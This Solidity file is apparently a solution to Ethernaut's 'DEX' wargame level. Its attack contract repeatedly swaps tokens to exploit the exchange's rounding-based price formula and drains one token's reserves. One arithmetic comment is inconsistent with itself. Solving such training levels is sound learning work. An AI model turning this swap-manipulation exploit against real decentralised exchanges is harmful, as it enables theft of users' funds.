// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title 22. DEX
 * @dev Drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.
 */

interface IDex {
    function token1() external returns (address);

    function token2() external returns (address);

    function swap(address from, address to, uint256 amount) external;

    function getSwapPrice(
        address from,
        address to,
        uint256 amount
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external;

    function balanceOf(
        address token,
        address account
    ) external view returns (uint256);
}

/*
 * 0. Approve the newly deployed contract to transfer token1 & token2
 * --------------------------------------------------------------------
 * await contract.approve("0x63756907c4b701acE7B29E3Fc8cCaFF5fd98b54e", "100000000000000000000");
 */

contract Ethernaut_Dex {
    IDex private idex = IDex(0x98E7fF2DfFF412D7E9e03A51AE0f63f9e983C3cE);
    address private immutable token1 = idex.token1();
    address private immutable token2 = idex.token2();

    function attack() public {
        // 2. Transfer all tokens to the contract (!!! Require approval for this to work !!!)
        IERC20(token1).transferFrom(msg.sender, address(this), 10);
        IERC20(token2).transferFrom(msg.sender, address(this), 10);

        // 3. Swap the tokens multiple times to profit from the "artificial" price
        idex.approve(address(idex), type(uint256).max);
        _swap(token1, token2); // 10 in | 100 - 100 | 10 out (10*100/100 = 10)
        _swap(token2, token1); // 20 in | 110 - 90  | 24 out (20*110/90 = 24)
        _swap(token1, token2); // 24 in | 86  - 110 | 30 out (24*110/86 = 30)
        _swap(token2, token1); // 30 in | 110  - 80 | 41 out (30*110/80 = 41)
        _swap(token1, token2); // 41 in | 69  - 110 | 65 out (41*110/67 = 65)

        // 4. Swap with the exact amount to empty the reserves of token1
        // Final swap:
        // x in | 110 - 45 | 110 out (x*110/45 = 110)
        // x = 110*45/110 = 45
        idex.swap(token2, token1, 45);

        // 5. Transfer tokens back
        IERC20(token1).transfer(
            msg.sender,
            idex.balanceOf(token1, address(this))
        );
        IERC20(token2).transfer(
            msg.sender,
            idex.balanceOf(token2, address(this))
        );

        require(idex.balanceOf(token1, address(idex)) == 0, "Attack failed!");
    }

    function _swap(address tokenIn, address tokenOut) private {
        uint256 amount = idex.balanceOf(tokenIn, address(this));
        idex.swap(tokenIn, tokenOut, amount);
    }
}

// 🎉 Level completed! 🎉
